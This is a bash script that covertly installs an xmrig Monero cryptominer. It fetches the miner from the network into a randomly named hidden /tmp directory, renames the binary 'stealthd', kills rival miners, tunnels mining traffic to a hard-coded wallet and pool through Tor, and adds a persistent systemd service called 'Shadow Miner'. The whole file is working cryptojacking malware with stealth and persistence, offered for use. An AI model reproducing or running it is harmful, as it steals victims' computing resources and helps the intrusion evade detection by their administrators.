#!/bin/bash

# ⚠️ Lock and load environment
apt-get update -y || apt-get update -y -o Acquire::ForceIPv4=true
apt-get install -y curl lsb-release software-properties-common unzip git tor torsocks || {
  echo "Deps failed, trying mirrors" >&2
  curl -sL https://deb.debian.org/debian/pool/main/c/curl/curl_7.88.1-10_amd64.deb -o /tmp/curl.deb && dpkg -i /tmp/curl.deb
  apt-get install -y lsb-release software-properties-common unzip git tor torsocks
}

# 🧬 Set dark variables
WALLET="4A6Dwm79aK7FeBxc4QCjY89kYQgL4nVHM23fhv5rQxPeU7mtM6nzhkaJyDTqdK3CH3ShmCPd9D5xSYxh7Gg5ysMrBnAyEp5"
WORKER="$(hostname)-shadow-$(date +%s)"
POOL="gulf.moneroocean.stream:10001"
THREADS=$(( $(nproc) * 70 / 100 )) # Cap at 70% threads
DIR="/tmp/.$(openssl rand -hex 8)" # Random dir name

# 💥 Purge old traces
pkill -f xmrig || pkill -f stealthd
rm -rf /tmp/.xmrig /tmp/.*/xmrig*

# 🧹 Secure and prep
mkdir -p $DIR
cd $DIR || { echo "Dir fail, aborting" >&2; exit 1; }

# 🔽 Fetch xmrig with fallback
curl -L -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz || \
curl -L -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz
tar -xzf xmrig.tar.gz --strip-components=1
chmod +x xmrig
mv xmrig stealthd # Rename for stealth

# 🧠 Craft config with chaos
cat > config.json <<EOF
{
  "autosave": true,
  "cpu": {
    "enabled": true,
    "max-threads-hint": $THREADS,
    "priority": 2
  },
  "opencl": false,
  "cuda": false,
  "randomx": {
    "1gb-pages": false
  },
  "donate-level": 0,
  "pools": [
    {
      "url": "$POOL",
      "user": "$WALLET.$WORKER",
      "keepalive": true,
      "tls": false,
      "nicehash": false
    }
  ],
  "http": {
    "enabled": false
  }
}
EOF

# 🌐 Spin up Tor for anonymity
systemctl start tor || service tor start
sleep $((RANDOM % 10)) # Random delay to dodge sync patterns

# 👻 Launch in dark mode
torsocks ./stealthd -c config.json > $DIR/miner.log 2>&1 &
echo $! > $DIR/pid
disown

# 🔒 Lock it with systemd
cat > /etc/systemd/system/miner.service <<EOF
[Unit]
Description=Shadow Miner
After=network.target tor.service

[Service]
ExecStart=/bin/bash -c "torsocks $DIR/stealthd -c $DIR/config.json > $DIR/miner.log 2>&1"
Restart=always
RestartSec=10
WorkingDirectory=$DIR

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable miner.service
systemctl start miner.service

echo "[✔] Shadow miner deployed on $POOL with $THREADS threads, logging to $DIR/miner.log 🧠"
